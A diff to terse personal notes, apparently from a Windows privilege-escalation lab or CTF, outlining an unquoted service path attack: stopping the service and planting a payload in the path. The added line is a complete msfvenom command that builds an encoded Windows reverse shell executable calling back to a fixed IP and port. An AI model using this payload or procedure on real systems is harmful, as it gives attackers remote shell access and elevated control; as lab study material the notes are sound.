@@ -9,5 +9,6 @@ powershell mafia ps script
 use unquoted strings to get service we can exploit 
 turn off service using sc net stop service
 crate a payload with msf venom add advanced.exe 
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.135.33 LPORT=4443 -e x86/shikata_ga_nai -f exe -o Advanced.exe
 to its path
 run 
